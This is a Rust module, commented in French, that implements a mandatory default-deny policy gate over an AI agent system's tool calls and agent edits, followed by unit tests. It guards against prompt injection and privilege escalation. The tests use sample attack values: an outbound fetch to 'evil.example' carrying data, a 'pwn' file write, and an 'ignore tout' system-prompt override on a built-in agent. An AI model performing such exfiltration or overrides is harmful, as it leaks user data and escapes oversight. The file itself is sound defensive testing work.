//! @id     maia_gouvernance
//! @do     soumettre_actions_maia_a_strongfather
//! @role   security
//! @layer  app
//! @human  MAIA — toute exécution d'outil et toute création / modification d'agent passe par
//! @human  la porte obligatoire StrongFather (BondingBrother), refus par défaut (K-11, K-9).
//!
//! # Gouvernance StrongFather de MAIA
//!
//! - Politiques chargées au démarrage depuis `<répertoire>/maia.toml` ; répertoire =
//!   `politiques_dir` de `bridge.toml`, sinon `COG_POLITIQUES_DIR`, sinon `config/strongfather`
//! - Fichier absent ou invalide ⇒ [`GouvernanceMaia`] **indisponible** : tout outil et toute
//!   écriture d'agent sont refusés (fail-closed, journalisé), jamais « tout autoriser »
//! - Les contrôles existants (niveau de sécurité, liste de skills, garde « contenu étranger »,
//!   confirmations) restent en place : StrongFather est la décision obligatoire **en plus**,
//!   juste avant l'exécution (défense en profondeur)
//! - Point d'entrée unique pour les outils : `tools::executer_outil_gouverne`
//!
//! ## Forme des intentions (convention COG partagée avec Alicia / Market / Admin)
//!
//! Outil :
//! - `action` : `read` (effet lecture ou appel sortant) ou `modification` (effet écriture)
//! - `subject` : `maia.agent.<agent_id>` ; `caller` : `local` ; `origin` : `maia`
//! - `data.operation = 'outil'`, `data.outil`, `data.agent`, `data.niveau`,
//!   `data.niveau_rang` (0..3), `data.competence_autorisee`, `data.effet`
//!   (`lecture`/`sortant`/`ecriture`), `data.contenu_etranger` (`true`/`false`, `EtatTour`),
//!   `data.mode` (`boucle`/`confirmee`/`direct`), `data.autorisation`
//!   (`standard`/`ecriture_confirmee`), `data.action`, `data.service` (vides si absents)
//!
//! Agent :
//! - `action` : `creation` (`POST /v1/agents`) ou `modification` (`PUT /v1/agents/{id}`)
//! - `subject` : `maia.agent.<agent_id>`
//! - `data.operation` (`agent.creer`/`agent.modifier`), `data.agent`, `data.existe`,
//!   `data.cible_builtin`, `data.niveau`, `data.niveau_rang`, `data.niveau_precedent_rang`,
//!   `data.elevation_niveau`, `data.competences`, `data.competences_ajoutees` (entier),
//!   `data.dispatch_ajoute`, `data.prompt_modifie`, `data.modification_cosmetique`

use std::collections::HashMap;
use std::path::{Path, PathBuf};

use bondingbrother::strongfather::{ActionType, CallContext, IntentData};
use bondingbrother::{executer_si_autorise, DecisionAutorisee, Intent, PorteStrongFather};

use crate::agents::{AgentDef, SecurityLevel};
use crate::garde_etranger::{self, EffetOutil};
use crate::skills::Autorisation;

/// Variable d'environnement surchargeant le répertoire des politiques StrongFather.
pub const ENV_POLITIQUES_DIR: &str = "COG_POLITIQUES_DIR";
/// Répertoire par défaut des politiques (relatif au répertoire courant).
pub const POLITIQUES_DIR_DEFAUT: &str = "config/strongfather";
/// Fichier de politiques du domaine MAIA.
pub const FICHIER_POLITIQUES_MAIA: &str = "maia.toml";
/// Origine des intentions MAIA.
pub const ORIGINE_MAIA: &str = "maia";
/// Appelant quand le principal humain n'est pas connu.
pub const APPELANT_LOCAL: &str = "local";

/// Chemin du fichier de politiques MAIA : répertoire configuré, sinon
/// `COG_POLITIQUES_DIR`, sinon `config/strongfather`.
pub fn chemin_politiques_maia(repertoire_config: Option<&str>) -> PathBuf {
    let base = repertoire_config
        .map(str::trim)
        .filter(|r| !r.is_empty())
        .map(PathBuf::from)
        .or_else(|| {
            std::env::var_os(ENV_POLITIQUES_DIR)
                .filter(|v| !v.is_empty())
                .map(PathBuf::from)
        })
        .unwrap_or_else(|| PathBuf::from(POLITIQUES_DIR_DEFAUT));
    base.join(FICHIER_POLITIQUES_MAIA)
}

/// Porte StrongFather de MAIA. Sans politiques valides, elle refuse tout.
#[derive(Clone)]
pub struct GouvernanceMaia {
    porte: Result<PorteStrongFather, String>,
}

impl std::fmt::Debug for GouvernanceMaia {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("GouvernanceMaia")
            .field("operationnelle", &self.porte.is_ok())
            .finish()
    }
}

impl GouvernanceMaia {
    /// Gouvernance adossée à une porte déjà construite.
    pub fn new(porte: PorteStrongFather) -> Self {
        Self { porte: Ok(porte) }
    }

    /// Charge les politiques depuis un fichier ; absent ou invalide ⇒ indisponible.
    pub fn depuis_fichier(chemin: impl AsRef<Path>) -> Self {
        let chemin = chemin.as_ref();
        match PorteStrongFather::depuis_fichier(chemin) {
            Ok(porte) => {
                tracing::info!(
                    "Politiques StrongFather MAIA chargées : {}",
                    chemin.display()
                );
                Self::new(porte)
            }
            Err(e) => {
                tracing::error!(
                    "Politiques StrongFather MAIA indisponibles ({}) : {e} — tout outil et toute \
                     écriture d'agent seront refusés",
                    chemin.display()
                );
                Self::indisponible(format!("{} : {e}", chemin.display()))
            }
        }
    }

    /// Gouvernance sans politiques : refuse tout avec ce motif.
    pub fn indisponible(motif: impl Into<String>) -> Self {
        Self {
            porte: Err(motif.into()),
        }
    }

    /// Vrai si des politiques valides sont chargées.
    pub fn est_operationnelle(&self) -> bool {
        self.porte.is_ok()
    }

    /// Exécute `action` seulement si StrongFather autorise `intent` (porte
    /// obligatoire `executer_si_autorise`). Refus ⇒ `Err(motif)`, action non appelée.
    pub fn executer<T>(
        &self,
        intent: &Intent,
        action: impl FnOnce(&DecisionAutorisee) -> T,
    ) -> Result<T, String> {
        let porte = self.porte.as_ref().map_err(|motif| {
            format!("StrongFather indisponible (politiques non chargées : {motif}) — refus")
        })?;
        executer_si_autorise(porte, intent, action).map_err(|refus| {
            tracing::info!(
                "StrongFather refuse '{}' ({}) : règle {}",
                intent.subject,
                intent.action_type.as_str(),
                refus.regle()
            );
            refus.to_string()
        })
    }
}

/// Contexte d'exécution d'un outil.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ModeExecution {
    /// Appel décidé par le modèle dans la boucle de tool calling.
    Boucle,
    /// Action suspendue puis confirmée explicitement par l'utilisateur.
    Confirmee,
    /// Appel direct de l'API skills (`POST /v1/skills/{id}/execute`).
    Direct,
}

impl ModeExecution {
    /// Nom canonique (valeur de `data.mode`).
    pub const fn nom(self) -> &'static str {
        match self {
            ModeExecution::Boucle => "boucle",
            ModeExecution::Confirmee => "confirmee",
            ModeExecution::Direct => "direct",
        }
    }
}

/// Demande d'exécution d'un outil soumise à StrongFather.
#[derive(Debug, Clone, Copy)]
pub struct DemandeOutil<'a> {
    /// Agent qui exécute.
    pub agent: &'a AgentDef,
    /// Skill / outil demandé.
    pub skill_id: &'a str,
    /// Paramètres de l'appel.
    pub params: &'a HashMap<String, serde_json::Value>,
    /// Autorisation accordée à l'exécution.
    pub autorisation: Autorisation,
    /// Vrai si le tour a ingéré du contenu étranger (`EtatTour`).
    pub contenu_etranger: bool,
    /// Contexte d'exécution.
    pub mode: ModeExecution,
    /// Principal humain / session, `local` si inconnu.
    pub appelant: &'a str,
}

fn nom_niveau(n: SecurityLevel) -> &'static str {
    match n {
        SecurityLevel::ReadOnly => "read_only",
        SecurityLevel::Sandboxed => "sandboxed",
        SecurityLevel::Extended => "extended",
        SecurityLevel::Full => "full",
    }
}

fn rang(n: SecurityLevel) -> String {
    (n as u8).to_string()
}

fn identifiant_intention(prefixe: &str) -> String {
    format!("{prefixe}-{}", garde_etranger::identifiant_aleatoire())
}

fn intention(
    id: String,
    action: ActionType,
    agent_id: &str,
    appelant: &str,
    data: HashMap<String, String>,
) -> Intent {
    let appelant = if appelant.trim().is_empty() {
        APPELANT_LOCAL
    } else {
        appelant
    };
    Intent::new(
        id,
        action,
        format!("maia.agent.{}", agent_id.to_lowercase()),
        CallContext {
            caller_identity: appelant.to_string(),
            origin: ORIGINE_MAIA.to_string(),
            instance: "local".to_string(),
        },
        IntentData { content: data },
    )
}

/// Intention StrongFather d'une exécution d'outil.
pub fn intention_outil(d: &DemandeOutil<'_>) -> Intent {
    let effet = garde_etranger::classer_appel(d.skill_id, d.params);
    let texte = |cle: &str| {
        d.params
            .get(cle)
            .and_then(|v| v.as_str())
            .unwrap_or_default()
            .to_string()
    };
    let mut data = HashMap::new();
    data.insert("operation".into(), "outil".into());
    data.insert("outil".into(), d.skill_id.to_string());
    data.insert("agent".into(), d.agent.id.clone());
    data.insert("niveau".into(), nom_niveau(d.agent.security_level).into());
    data.insert("niveau_rang".into(), rang(d.agent.security_level));
    data.insert(
        "competence_autorisee".into(),
        d.agent
            .skill_ids
            .iter()
            .any(|s| s == d.skill_id)
            .to_string(),
    );
    data.insert(
        "effet".into(),
        match effet {
            EffetOutil::Lecture => "lecture",
            EffetOutil::Sortant => "sortant",
            EffetOutil::Ecriture => "ecriture",
        }
        .into(),
    );
    data.insert("contenu_etranger".into(), d.contenu_etranger.to_string());
    data.insert("mode".into(), d.mode.nom().into());
    data.insert(
        "autorisation".into(),
        match d.autorisation {
            Autorisation::Standard => "standard",
            Autorisation::EcritureConfirmee => "ecriture_confirmee",
        }
        .into(),
    );
    data.insert("action".into(), texte("action"));
    data.insert("service".into(), texte("service"));
    let action = match effet {
        EffetOutil::Lecture | EffetOutil::Sortant => ActionType::Read,
        EffetOutil::Ecriture => ActionType::Modification,
    };
    let mut i = intention(
        identifiant_intention("maia-outil"),
        action,
        &d.agent.id,
        d.appelant,
        data,
    );
    i.metadata.insert("mode".into(), d.mode.nom().into());
    i
}

/// Opération d'administration d'agent.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OperationAgent {
    /// `POST /v1/agents`.
    Creer,
    /// `PUT /v1/agents/{id}`.
    Modifier,
    /// `DELETE /v1/agents/{id}`.
    Supprimer,
}

/// Intention StrongFather d'une création / modification d'agent.
/// `existant` : définition actuelle de l'agent ciblé (s'il existe).
pub fn intention_agent(
    operation: OperationAgent,
    nouveau: &AgentDef,
    existant: Option<&AgentDef>,
    appelant: &str,
) -> Intent {
    let mut competences = nouveau.skill_ids.clone();
    competences.sort();
    competences.dedup();
    let ajoutees = competences
        .iter()
        .filter(|s| existant.is_none_or(|e| !e.skill_ids.contains(s)))
        .count();
    let niveau_precedent = existant.map(|e| e.security_level);
    let cosmetique = existant.is_some_and(|e| {
        operation == OperationAgent::Modifier
            && e.role == nouveau.role
            && e.system_prompt == nouveau.system_prompt
            && e.skill_ids == nouveau.skill_ids
            && e.security_level == nouveau.security_level
            && e.can_dispatch == nouveau.can_dispatch
    });

    let mut data = HashMap::new();
    data.insert(
        "operation".into(),
        match operation {
            OperationAgent::Creer => "agent.creer",
            OperationAgent::Modifier => "agent.modifier",
            OperationAgent::Supprimer => "agent.supprimer",
        }
        .into(),
    );
    data.insert("agent".into(), nouveau.id.clone());
    data.insert("existe".into(), existant.is_some().to_string());
    data.insert(
        "cible_builtin".into(),
        existant.is_some_and(|e| e.is_builtin).to_string(),
    );
    data.insert("niveau".into(), nom_niveau(nouveau.security_level).into());
    data.insert("niveau_rang".into(), rang(nouveau.security_level));
    data.insert(
        "niveau_precedent_rang".into(),
        niveau_precedent.map_or_else(|| "0".to_string(), rang),
    );
    data.insert(
        "elevation_niveau".into(),
        niveau_precedent
            .is_some_and(|p| nouveau.security_level > p)
            .to_string(),
    );
    data.insert("competences".into(), competences.join(","));
    data.insert("competences_ajoutees".into(), ajoutees.to_string());
    data.insert(
        "dispatch_ajoute".into(),
        (nouveau.can_dispatch && !existant.is_some_and(|e| e.can_dispatch)).to_string(),
    );
    data.insert(
        "prompt_modifie".into(),
        existant
            .is_some_and(|e| e.system_prompt != nouveau.system_prompt)
            .to_string(),
    );
    data.insert("modification_cosmetique".into(), cosmetique.to_string());
    let action = match operation {
        OperationAgent::Creer => ActionType::Creation,
        OperationAgent::Modifier => ActionType::Modification,
        OperationAgent::Supprimer => ActionType::Deletion,
    };
    intention(
        identifiant_intention("maia-agent"),
        action,
        &nouveau.id,
        appelant,
        data,
    )
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use crate::agents::AgentRegistry;

    /// Politiques de base livrées avec le dépôt.
    pub(crate) fn chemin_politiques_de_base() -> PathBuf {
        PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../config/strongfather")
            .join(FICHIER_POLITIQUES_MAIA)
    }

    /// Gouvernance chargée depuis la politique de base (doit se charger).
    pub(crate) fn gouvernance_de_base() -> GouvernanceMaia {
        let g = GouvernanceMaia::depuis_fichier(chemin_politiques_de_base());
        assert!(g.est_operationnelle(), "maia.toml doit se charger");
        g
    }

    fn demande<'a>(
        agent: &'a AgentDef,
        skill: &'a str,
        params: &'a HashMap<String, serde_json::Value>,
        etranger: bool,
        mode: ModeExecution,
        autorisation: Autorisation,
    ) -> DemandeOutil<'a> {
        DemandeOutil {
            agent,
            skill_id: skill,
            params,
            autorisation,
            contenu_etranger: etranger,
            mode,
            appelant: APPELANT_LOCAL,
        }
    }

    fn params(v: serde_json::Value) -> HashMap<String, serde_json::Value> {
        serde_json::from_value(v).unwrap_or_default()
    }

    fn autorise(g: &GouvernanceMaia, i: &Intent) -> bool {
        g.executer(i, |_| ()).is_ok()
    }

    #[test]
    fn chemin_configure_puis_defaut() {
        assert_eq!(
            chemin_politiques_maia(Some("/etc/cog")),
            PathBuf::from("/etc/cog/maia.toml")
        );
        assert!(chemin_politiques_maia(None).ends_with("maia.toml"));
    }

    #[test]
    fn base_autorise_les_outils_legitimes_de_chaque_agent_builtin() {
        let g = gouvernance_de_base();
        let agents = AgentRegistry::new();
        let lecture = params(serde_json::json!({ "action": "read", "path": "a.txt" }));
        let url = params(serde_json::json!({ "url": "https://exemple.org/" }));
        let shell = params(serde_json::json!({ "command": "ls" }));
        let liste = params(serde_json::json!({ "action": "list" }));
        for resume in agents.list_agents() {
            let agent = agents.get_agent(&resume.id).expect("agent");
            for skill in &agent.skill_ids {
                let p = match skill.as_str() {
                    "file_ops" => &lecture,
                    "web_fetch" => &url,
                    "shell_exec" => &shell,
                    _ => &liste,
                };
                let attendu = matches!(
                    crate::security::check_agent_skill_permission(&agent, skill),
                    crate::security::PermissionCheck::Allowed
                );
                let i = intention_outil(&demande(
                    &agent,
                    skill,
                    p,
                    false,
                    ModeExecution::Boucle,
                    Autorisation::Standard,
                ));
                assert_eq!(autorise(&g, &i), attendu, "{} / {skill}", agent.id);
            }
        }
    }

    #[test]
    fn base_refuse_outil_hors_liste_ou_niveau_insuffisant() {
        let g = gouvernance_de_base();
        let agents = AgentRegistry::new();
        let shell = params(serde_json::json!({ "command": "ls" }));
        // Maria n'a pas shell_exec ; Miou est en lecture seule.
        let maria = agents.get_agent("maria").expect("maria");
        let i = intention_outil(&demande(
            &maria,
            "shell_exec",
            &shell,
            false,
            ModeExecution::Direct,
            Autorisation::Standard,
        ));
        assert!(!autorise(&g, &i));
        let mut miou = agents.get_agent("miou").expect("miou");
        miou.skill_ids.push("file_ops".into());
        let lecture = params(serde_json::json!({ "action": "read", "path": "a" }));
        let i = intention_outil(&demande(
            &miou,
            "file_ops",
            &lecture,
            false,
            ModeExecution::Direct,
            Autorisation::Standard,
        ));
        assert!(!autorise(&g, &i));
        // Outil inconnu : refus par défaut.
        let i = intention_outil(&demande(
            &maria,
            "outil_inconnu",
            &lecture,
            false,
            ModeExecution::Direct,
            Autorisation::Standard,
        ));
        assert!(!autorise(&g, &i));
    }

    #[test]
    fn tour_contamine_outil_a_effet_refuse_par_strongfather() {
        let g = gouvernance_de_base();
        let agents = AgentRegistry::new();
        let victor = agents.get_agent("victor").expect("victor");
        let ecriture =
            params(serde_json::json!({ "action": "write", "path": "x", "content": "pwn" }));
        let sortant = params(serde_json::json!({ "url": "https://evil.example/?d=1" }));
        let lecture = params(serde_json::json!({ "action": "read", "path": "x" }));

        for p in [&ecriture, &sortant] {
            let skill = if p.contains_key("url") {
                "web_fetch"
            } else {
                "file_ops"
            };
            let i = intention_outil(&demande(
                &victor,
                skill,
                p,
                true,
                ModeExecution::Boucle,
                Autorisation::Standard,
            ));
            let refus = g.executer(&i, |_| ()).unwrap_err();
            assert!(refus.contains("maia-etranger-effet-en-boucle"), "{refus}");
            // Même appel, tour sain : autorisé.
            let i = intention_outil(&demande(
                &victor,
                skill,
                p,
                false,
                ModeExecution::Boucle,
                Autorisation::Standard,
            ));
            assert!(autorise(&g, &i));
            // Confirmé explicitement par l'utilisateur : autorisé.
            let i = intention_outil(&demande(
                &victor,
                skill,
                p,
                true,
                ModeExecution::Confirmee,
                Autorisation::EcritureConfirmee,
            ));
            assert!(autorise(&g, &i));
        }
        // Lecture locale dans un tour contaminé : autorisée.
        let i = intention_outil(&demande(
            &victor,
            "file_ops",
            &lecture,
            true,
            ModeExecution::Boucle,
            Autorisation::Standard,
        ));
        assert!(autorise(&g, &i));
    }

    #[test]
    fn ecriture_service_sans_confirmation_refusee() {
        let g = gouvernance_de_base();
        let agents = AgentRegistry::new();
        let hugo = agents.get_agent("hugo").expect("hugo");
        let p = params(serde_json::json!({ "action": "call", "service": "jaykonta",
            "endpoint": "/intents/add_movement", "method": "POST", "body": {} }));
        let i = intention_outil(&demande(
            &hugo,
            "cog_services",
            &p,
            false,
            ModeExecution::Direct,
            Autorisation::Standard,
        ));
        assert!(g
            .executer(&i, |_| ())
            .unwrap_err()
            .contains("maia-ecriture-service-sans-confirmation"));
        let i = intention_outil(&demande(
            &hugo,
            "cog_services",
            &p,
            false,
            ModeExecution::Direct,
            Autorisation::EcritureConfirmee,
        ));
        assert!(autorise(&g, &i));
    }

    #[test]
    fn fichier_absent_ou_invalide_refuse_tout() {
        let dir = std::env::temp_dir().join(format!(
            "maia-sf-{}",
            garde_etranger::identifiant_aleatoire()
        ));
        std::fs::create_dir_all(&dir).expect("tmp");
        let invalide = dir.join("maia.toml");
        std::fs::write(&invalide, "version = 1\n[[policy]]\nid = 'x'\n").expect("écriture");
        let agents = AgentRegistry::new();
        let maria = agents.get_agent("maria").expect("maria");
        let p = params(serde_json::json!({ "action": "read", "path": "a" }));
        let i = intention_outil(&demande(
            &maria,
            "file_ops",
            &p,
            false,
            ModeExecution::Direct,
            Autorisation::Standard,
        ));
        for g in [
            GouvernanceMaia::depuis_fichier(dir.join("absent.toml")),
            GouvernanceMaia::depuis_fichier(&invalide),
        ] {
            assert!(!g.est_operationnelle());
            let mut appele = false;
            let refus = g.executer(&i, |_| appele = true).unwrap_err();
            assert!(refus.contains("indisponible"), "{refus}");
            assert!(!appele);
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    fn agent_custom(id: &str, niveau: SecurityLevel, skills: &[&str]) -> AgentDef {
        AgentDef {
            id: id.into(),
            display_name: id.into(),
            role: "r".into(),
            description: String::new(),
            system_prompt: "p".into(),
            skill_ids: skills.iter().map(|s| (*s).to_string()).collect(),
            model_preference: crate::agents::ModelPreference::Balanced,
            security_level: niveau,
            is_builtin: false,
            icon: String::new(),
            can_dispatch: false,
        }
    }

    #[test]
    fn administration_des_agents() {
        let g = gouvernance_de_base();
        let agents = AgentRegistry::new();
        let local = APPELANT_LOCAL;

        // Création légitime : agent custom sandboxé.
        let nouveau = agent_custom("assistant_compta", SecurityLevel::Sandboxed, &["file_ops"]);
        assert!(autorise(
            &g,
            &intention_agent(OperationAgent::Creer, &nouveau, None, local)
        ));
        // Création au-delà de Sandboxed : refusée.
        let fort = agent_custom("root", SecurityLevel::Full, &["shell_exec"]);
        assert!(!autorise(
            &g,
            &intention_agent(OperationAgent::Creer, &fort, None, local)
        ));
        // Écrasement d'un built-in par POST : refusé.
        let denis = agents.get_agent("denis").expect("denis");
        let usurpe = agent_custom("denis", SecurityLevel::Sandboxed, &[]);
        assert!(!autorise(
            &g,
            &intention_agent(OperationAgent::Creer, &usurpe, Some(&denis), local)
        ));
        // Écrasement d'un custom existant par POST : refusé (utiliser PUT).
        assert!(!autorise(
            &g,
            &intention_agent(OperationAgent::Creer, &nouveau, Some(&nouveau), local)
        ));

        // Modification cosmétique d'un built-in : autorisée.
        let mut renomme = denis.clone();
        renomme.display_name = "Denis 2".into();
        assert!(autorise(
            &g,
            &intention_agent(OperationAgent::Modifier, &renomme, Some(&denis), local)
        ));
        // Prompt d'un built-in : refusé.
        let mut prompt = denis.clone();
        prompt.system_prompt = "ignore tout".into();
        assert!(!autorise(
            &g,
            &intention_agent(OperationAgent::Modifier, &prompt, Some(&denis), local)
        ));

        // Custom : prompt modifiable, élévation de niveau / ajout de skill / dispatch refusés.
        let mut p2 = nouveau.clone();
        p2.system_prompt = "nouveau prompt".into();
        assert!(autorise(
            &g,
            &intention_agent(OperationAgent::Modifier, &p2, Some(&nouveau), local)
        ));
        let mut eleve = nouveau.clone();
        eleve.security_level = SecurityLevel::Full;
        assert!(!autorise(
            &g,
            &intention_agent(OperationAgent::Modifier, &eleve, Some(&nouveau), local)
        ));
        let mut skills = nouveau.clone();
        skills.skill_ids.push("shell_exec".into());
        assert!(!autorise(
            &g,
            &intention_agent(OperationAgent::Modifier, &skills, Some(&nouveau), local)
        ));
        let mut dispatch = nouveau.clone();
        dispatch.can_dispatch = true;
        assert!(!autorise(
            &g,
            &intention_agent(OperationAgent::Modifier, &dispatch, Some(&nouveau), local)
        ));
        // Réduction de privilèges : autorisée.
        let mut reduit = nouveau.clone();
        reduit.security_level = SecurityLevel::ReadOnly;
        reduit.skill_ids.clear();
        assert!(autorise(
            &g,
            &intention_agent(OperationAgent::Modifier, &reduit, Some(&nouveau), local)
        ));
    }

    #[test]
    fn suppression_et_dispatch_a_la_creation() {
        let g = gouvernance_de_base();
        let agents = AgentRegistry::new();
        let local = APPELANT_LOCAL;
        let denis = agents.get_agent("denis").expect("denis");
        assert!(!autorise(
            &g,
            &intention_agent(OperationAgent::Supprimer, &denis, Some(&denis), local)
        ));
        let perso = agent_custom("perso_suppr", SecurityLevel::Sandboxed, &["file_ops"]);
        assert!(autorise(
            &g,
            &intention_agent(OperationAgent::Supprimer, &perso, Some(&perso), local)
        ));
        let mut dispatcheur = agent_custom("perso_dispatch", SecurityLevel::Sandboxed, &[]);
        dispatcheur.can_dispatch = true;
        assert!(!autorise(
            &g,
            &intention_agent(OperationAgent::Creer, &dispatcheur, None, local)
        ));
    }

    #[test]
    fn forme_de_l_intention_outil() {
        let agents = AgentRegistry::new();
        let victor = agents.get_agent("victor").expect("victor");
        let p = params(serde_json::json!({ "url": "https://exemple.org/" }));
        let i = intention_outil(&demande(
            &victor,
            "web_fetch",
            &p,
            true,
            ModeExecution::Boucle,
            Autorisation::Standard,
        ));
        assert_eq!(i.subject, "maia.agent.victor");
        assert_eq!(i.call_context.caller_identity, "local");
        assert_eq!(i.call_context.origin, "maia");
        assert_eq!(i.action_type.as_str(), "read");
        assert_eq!(i.data.content["outil"], "web_fetch");
        assert_eq!(i.data.content["effet"], "sortant");
        assert_eq!(i.data.content["contenu_etranger"], "true");
        assert_eq!(i.data.content["niveau"], "sandboxed");
        assert_eq!(i.data.content["service"], "");
    }
}
